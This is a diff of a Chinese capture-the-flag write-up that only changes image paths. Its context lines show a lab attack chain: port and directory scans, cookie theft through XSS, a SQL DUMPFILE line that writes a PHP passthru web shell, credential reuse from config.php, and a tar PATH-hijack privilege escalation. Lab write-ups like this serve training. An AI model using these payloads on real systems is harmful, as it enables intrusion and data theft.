@@ -26,7 +26,7 @@ sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31
 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
 ```
 
-![aaa.png](aaa.png)
+![aaa.png](content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png)
 
 ## gobuster 爆破目录
 
@@ -36,17 +36,17 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![bbb.png](bbb.png)
+![bbb.png](content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png)
 
 # Web 渗透
 
 审计爆破的目录发现在 admin 下有一个登入界面
 
-![ccc.png](ccc.png)
+![ccc.png](content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png)
 
 默认界面能找到提交表单
 
-![ddd.png](ddd.png)
+![ddd.png](content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png)
 
 尝试 XSS 
 
@@ -62,11 +62,11 @@ kali 架设连接
 python3 -m http.server 80
 ```
 
-![fff.png](fff.png)
+![fff.png](content/posts/Credit%20Card%20Scammers%20Writeup/fff.png)
 
 修改 cookie 登入
 
-![ggg.png](ggg.png)
+![ggg.png](content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png)
 
 注入 sql 反弹 shell
 
@@ -78,7 +78,7 @@ SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php
 http://10.10.10.33/shell.php?cmd=pwd
 ```
 
-![hhh.png](hhh.png)
+![hhh.png](content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png)
 
 连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口
 
@@ -98,21 +98,21 @@ ls
 cat config.php
 ```
 
-![iii](iii.png)
+![iii](content/posts/Credit%20Card%20Scammers%20Writeup/iii.png)
 
 ```
 mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e 'SELECT * from users;' 
 ```
 
-![jjj](jjj.png)
+![jjj](content/posts/Credit%20Card%20Scammers%20Writeup/jjj.png)
 
 john 破解
 
-![kkk](kkk.png)
+![kkk](content/posts/Credit%20Card%20Scammers%20Writeup/kkk.png)
 
 ssh 登入
 
-![lll](lll.png)
+![lll](content/posts/Credit%20Card%20Scammers%20Writeup/lll.png)
 
 二阶段提权
 
@@ -136,6 +136,6 @@ chmod 777 tar
 /usr/bin/backup
 ```
 
-![mmm](mmm.png)
+![mmm](content/posts/Credit%20Card%20Scammers%20Writeup/mmm.png)
 
 拿下机器
